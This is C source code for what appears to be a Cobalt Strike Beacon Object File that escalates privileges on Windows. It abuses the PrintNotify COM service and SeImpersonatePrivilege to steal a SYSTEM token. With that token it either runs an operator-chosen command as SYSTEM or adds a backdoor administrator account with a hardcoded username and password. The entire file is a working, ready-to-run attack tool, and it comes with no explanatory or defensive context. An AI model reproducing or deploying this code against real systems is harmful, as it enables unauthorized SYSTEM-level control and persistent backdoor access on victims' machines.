#include <windows.h>
#include <lm.h>
#include "beacon.h"

#define UNLEN 256

DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$ConvertSidToStringSidW(PSID, LPWSTR*);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CreateProcessAsUserW(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$LogonUserA(LPCSTR, LPCSTR, LPCSTR, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT WINADVAPI BOOL WINAPI OLE32$IsEqualGUID(REFGUID, REFGUID);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CLSIDFromString(LPCWSTR, LPCLSID);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoImpersonateClient(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitialize(LPVOID);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*);
DECLSPEC_IMPORT VOID WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, LPBYTE, DWORD);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT errno_t __cdecl MSVCRT$mbstowcs_s(size_t*, wchar_t*, size_t, const char*, size_t);
DECLSPEC_IMPORT int __cdecl MSVCRT$wcscmp(const wchar_t*, const wchar_t*);

typedef struct IEnumConnectionPoints IEnumConnectionPoints;
typedef struct IEnumConnections IEnumConnections;
typedef struct IConnectionPoint IConnectionPoint;
typedef struct IConnectionPointContainer IConnectionPointContainer;

typedef struct IEnumConnectionPointsVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IEnumConnectionPoints*, REFIID, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(IEnumConnectionPoints*);
    ULONG (STDMETHODCALLTYPE *Release)(IEnumConnectionPoints*);
    HRESULT (STDMETHODCALLTYPE *Next)(IEnumConnectionPoints*, ULONG, IConnectionPoint**, ULONG*);
    HRESULT (STDMETHODCALLTYPE *Skip)(IEnumConnectionPoints*, ULONG);
    HRESULT (STDMETHODCALLTYPE *Reset)(IEnumConnectionPoints*);
    HRESULT (STDMETHODCALLTYPE *Clone)(IEnumConnectionPoints*, IEnumConnectionPoints**);
} IEnumConnectionPointsVtbl;

typedef struct IEnumConnectionPoints {
    IEnumConnectionPointsVtbl *lpVtbl;
} IEnumConnectionPoints;

typedef struct IConnectionPointVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IConnectionPoint*, REFIID, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(IConnectionPoint*);
    ULONG (STDMETHODCALLTYPE *Release)(IConnectionPoint*);
    HRESULT (STDMETHODCALLTYPE *GetConnectionInterface)(IConnectionPoint*, IID*);
    HRESULT (STDMETHODCALLTYPE *GetConnectionPointContainer)(IConnectionPoint*, IConnectionPointContainer**);
    HRESULT (STDMETHODCALLTYPE *Advise)(IConnectionPoint*, IUnknown*, DWORD*);
    HRESULT (STDMETHODCALLTYPE *Unadvise)(IConnectionPoint*, DWORD);
    HRESULT (STDMETHODCALLTYPE *EnumConnections)(IConnectionPoint*, IEnumConnections**);
} IConnectionPointVtbl;

typedef struct IConnectionPoint {
    IConnectionPointVtbl *lpVtbl;
} IConnectionPoint;

typedef struct IConnectionPointContainerVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IConnectionPointContainer*, REFIID, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(IConnectionPointContainer*);
    ULONG (STDMETHODCALLTYPE *Release)(IConnectionPointContainer*);
    HRESULT (STDMETHODCALLTYPE *EnumConnectionPoints)(IConnectionPointContainer*, IEnumConnectionPoints**);
    HRESULT (STDMETHODCALLTYPE *FindConnectionPoint)(IConnectionPointContainer*, REFIID, IConnectionPoint**);
} IConnectionPointContainerVtbl;

typedef struct IConnectionPointContainer {
    IConnectionPointContainerVtbl *lpVtbl;
} IConnectionPointContainer;

typedef HRESULT (STDMETHODCALLTYPE *QueryInterfacePtr)(IUnknown*, REFIID, void**);
typedef ULONG (STDMETHODCALLTYPE *AddRefPtr)(IUnknown*);
typedef ULONG (STDMETHODCALLTYPE *ReleasePtr)(IUnknown*);

typedef struct {
    QueryInterfacePtr QueryInterface;
    AddRefPtr AddRef;
    ReleasePtr Release;
} IExampleVtbl;

typedef struct {
    IExampleVtbl *lpVtbl;
} IExample;

static HANDLE hToken_SYSTEM = NULL;

static BOOL IsTokenSystem(HANDLE hToken) {
    SECURITY_IMPERSONATION_LEVEL impersonationLevel = SecurityAnonymous;
    wchar_t *impersonationLevelstr = L"Unknown";
    PTOKEN_USER user = NULL;
    DWORD dwLength = 0;
    LPWSTR sid_name = NULL;
    BOOL ok = FALSE;

    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
    if (KERNEL32$GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        return FALSE;

    user = (PTOKEN_USER)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
    if (!user)
        return FALSE;

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, user, dwLength, &dwLength)) {
        BeaconPrintf(CALLBACK_ERROR, "Error getting token user %lu\n", KERNEL32$GetLastError());
        goto done;
    }

    if (!ADVAPI32$ConvertSidToStringSidW(user->User.Sid, &sid_name))
        goto done;

    dwLength = sizeof(SECURITY_IMPERSONATION_LEVEL);
    ADVAPI32$GetTokenInformation(hToken, TokenImpersonationLevel, &impersonationLevel, sizeof(impersonationLevel), &dwLength);

    switch (impersonationLevel) {
    case SecurityAnonymous: impersonationLevelstr = L"Anonymous"; break;
    case SecurityIdentification: impersonationLevelstr = L"Identification"; break;
    case SecurityImpersonation: impersonationLevelstr = L"Impersonation"; break;
    case SecurityDelegation: impersonationLevelstr = L"Delegation"; break;
    default: break;
    }

    if (!MSVCRT$wcscmp(sid_name, L"S-1-5-18") && impersonationLevel >= SecurityImpersonation) {
        BeaconPrintf(CALLBACK_OUTPUT, "Obtained SYSTEM (%ls) token with impersonation level: %ls\n", sid_name, impersonationLevelstr);
        ok = TRUE;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Obtained (%ls) token with impersonation level: %ls\n", sid_name, impersonationLevelstr);
    }

done:
    if (sid_name)
        LocalFree(sid_name);
    return ok;
}

static BOOL EnablePriv(HANDLE hToken, LPCSTR priv) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$LookupPrivilegeValueA(NULL, priv, &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue() failed, error %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges() failed, error %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }
    return TRUE;
}

static HRESULT STDMETHODCALLTYPE ExampleQueryInterface(IUnknown *This, REFIID riid, void **ppvObj) {
    IExample *self = (IExample*)This;
    CLSID clsidIUnknown;

    hToken_SYSTEM = NULL;
    if (SUCCEEDED(OLE32$CoImpersonateClient())) {
        HANDLE hToken = NULL;
        if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken)) {
            if (hToken_SYSTEM == NULL)
                hToken_SYSTEM = hToken;
            else
                KERNEL32$CloseHandle(hToken);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Error opening token %lu\n", KERNEL32$GetLastError());
        }
    }

    OLE32$CLSIDFromString(L"{00000000-0000-0000-C000-000000000046}", &clsidIUnknown);
    if (OLE32$IsEqualGUID(riid, &clsidIUnknown)) {
        *ppvObj = self;
        return S_OK;
    }
    *ppvObj = NULL;
    return E_NOINTERFACE;
}

static ULONG STDMETHODCALLTYPE ExampleAddRef(IUnknown *This) { return 1; }
static ULONG STDMETHODCALLTYPE ExampleRelease(IUnknown *This) { return 1; }

static IExampleVtbl g_IExampleVtbl = {
    (QueryInterfacePtr)ExampleQueryInterface,
    (AddRefPtr)ExampleAddRef,
    (ReleasePtr)ExampleRelease
};

static BOOL CreateAdminUser(void) {
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 gi;
    DWORD nStatus;

    ui.usri1_name = (LPWSTR)L"hagrid";
    ui.usri1_password = (LPWSTR)L"P@ss@29hagr!d";
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    nStatus = NETAPI32$NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (nStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "NetUserAdd error: %lu", nStatus);
        return FALSE;
    }

    gi.lgrmi3_domainandname = ui.usri1_name;
    nStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&gi, 1);
    if (nStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "NetLocalGroupAddMembers error: %lu", nStatus);
        return FALSE;
    }
    return TRUE;
}

void go(char *args, int alen) {
    datap parser;
    char *processPath = NULL;
    char *commandLine = NULL;
    int method = 0;
    wchar_t *wProcessPath = NULL;
    wchar_t *wCommandLine = NULL;
    size_t wideSize = 0;
    size_t wideSize2 = 0;
    size_t convertedChars = 0;
    HANDLE hTokenCurrProc = NULL;
    HANDLE hTokenLogon = NULL;
    HRESULT hr = S_OK;
    BOOL backupInit = FALSE;
    CLSID clsidPrintNotify = {0};
    CLSID clsidIUnknown = {0};
    CLSID clsidIConnectionPointContainer = {0};
    IUnknown *pUnknown = NULL;
    IConnectionPointContainer *svc = NULL;
    IEnumConnectionPoints *pEnumConnectionPoints = NULL;
    IConnectionPoint *arr = NULL;
    IExample *example = NULL;
    ULONG num = 1;
    ULONG cookie = 0;
    SECURITY_ATTRIBUTES sa = {0};
    STARTUPINFOW startupInfo = {0};
    PROCESS_INFORMATION processInfo = {0};

    BeaconDataParse(&parser, args, alen);
    processPath = BeaconDataExtract(&parser, NULL);
    commandLine = BeaconDataExtract(&parser, NULL);
    method = BeaconDataInt(&parser);

    if (method != 3)
        BeaconPrintf(CALLBACK_OUTPUT, "Process Path = %s\nCommand Line = %s\n", processPath, commandLine);

    wideSize = MSVCRT$strlen(processPath) + 1;
    wProcessPath = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
    MSVCRT$mbstowcs_s(&convertedChars, wProcessPath, wideSize, processPath, _TRUNCATE);

    wideSize2 = MSVCRT$strlen(commandLine) + 1;
    wCommandLine = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
    MSVCRT$mbstowcs_s(&convertedChars, wCommandLine, wideSize2, commandLine, _TRUNCATE);

    ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrProc);
    if (!EnablePriv(hTokenCurrProc, SE_IMPERSONATE_NAME)) {
        BeaconPrintf(CALLBACK_ERROR, "SeImpersonatePrivilege properly not held\n");
        goto cleanup;
    }

    hr = OLE32$CoInitialize(NULL);
    backupInit = FALSE;
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitialize fail, Error: 0x%08lx\n", hr);
        if (BeaconIsAdmin()) {
            BeaconPrintf(CALLBACK_OUTPUT, "Attempt to initialize with CoInitializeEx alternatively\n");
            hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
            if (FAILED(hr))
                BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx fail, Error: 0x%08lx\n", hr);
            else
                backupInit = TRUE;
        }
    }

    if (!backupInit) {
        hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
        if (hr != S_OK) {
            BeaconPrintf(CALLBACK_ERROR, "CoInitializeSecurity fail, Error: 0x%08lx\n", hr);
            goto cleanup;
        }
    }

    if (!ADVAPI32$LogonUserA("X", "X", "X", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTokenLogon) || !BeaconUseToken(hTokenLogon)) {
        BeaconPrintf(CALLBACK_ERROR, "LogonUser and impersonate failed: %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    OLE32$CLSIDFromString(L"{854A20FB-2D44-457D-992F-EF13785D2B51}", &clsidPrintNotify);
    OLE32$CLSIDFromString(L"{00000000-0000-0000-C000-000000000046}", &clsidIUnknown);

    hr = OLE32$CoCreateInstance(&clsidPrintNotify, NULL, CLSCTX_LOCAL_SERVER, &clsidIUnknown, (void**)&pUnknown);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance fail, Error: 0x%08lx\n", hr);
        goto cleanup;
    }

    OLE32$CLSIDFromString(L"{B196B284-BAB4-101A-B69C-00AA00341D07}", &clsidIConnectionPointContainer);
    hr = pUnknown->lpVtbl->QueryInterface(pUnknown, &clsidIConnectionPointContainer, (void**)&svc);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "QueryInterface fail, Error: 0x%08lx\n", hr);
        goto cleanup;
    }

    hr = svc->lpVtbl->EnumConnectionPoints(svc, &pEnumConnectionPoints);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "EnumConnectionPoints fail, Error: 0x%08lx\n", hr);
        goto cleanup;
    }
    svc->lpVtbl->Release(svc);
    svc = NULL;

    hr = pEnumConnectionPoints->lpVtbl->Next(pEnumConnectionPoints, num, &arr, &cookie);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "Next fail, Error: 0x%08lx\n", hr);
        goto cleanup;
    }

    example = (IExample*)KERNEL32$GlobalAlloc(GMEM_FIXED, sizeof(IExample));
    example->lpVtbl = &g_IExampleVtbl;

    if (arr != NULL)
        arr->lpVtbl->Advise(arr, (IUnknown*)example, &cookie);

    if (!IsTokenSystem(hToken_SYSTEM)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SYSTEM token with proper impersonate level!");
        goto cleanup;
    }

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    startupInfo.cb = sizeof(startupInfo);

    if (method == 2) {
        EnablePriv(hToken_SYSTEM, SE_INCREASE_QUOTA_NAME);
        EnablePriv(hToken_SYSTEM, SE_ASSIGNPRIMARYTOKEN_NAME);
        BeaconUseToken(hToken_SYSTEM);
        if (!ADVAPI32$CreateProcessAsUserW(hToken_SYSTEM, wProcessPath, wCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)) {
            BeaconPrintf(CALLBACK_ERROR, "CreateProcessAsUserW failed: %lu\n", KERNEL32$GetLastError());
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessAsUserW successfully\n");
    } else if (method == 3) {
        BeaconUseToken(hToken_SYSTEM);
        if (CreateAdminUser())
            BeaconPrintf(CALLBACK_OUTPUT, "User hagrid with password P@ss@29hagr!d has been added into administrators");
        else
            goto cleanup;
    } else {
        if (!ADVAPI32$CreateProcessWithTokenW(hToken_SYSTEM, 0, wProcessPath, wCommandLine, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)) {
            BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW failed: %lu\n", KERNEL32$GetLastError());
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessWithTokenW successfully\n");
    }

cleanup:
    BeaconRevertToken();
    OLE32$CoUninitialize();
    if (hTokenCurrProc)
        KERNEL32$CloseHandle(hTokenCurrProc);
    if (hToken_SYSTEM)
        KERNEL32$CloseHandle(hToken_SYSTEM);
    if (hTokenLogon)
        KERNEL32$CloseHandle(hTokenLogon);
}
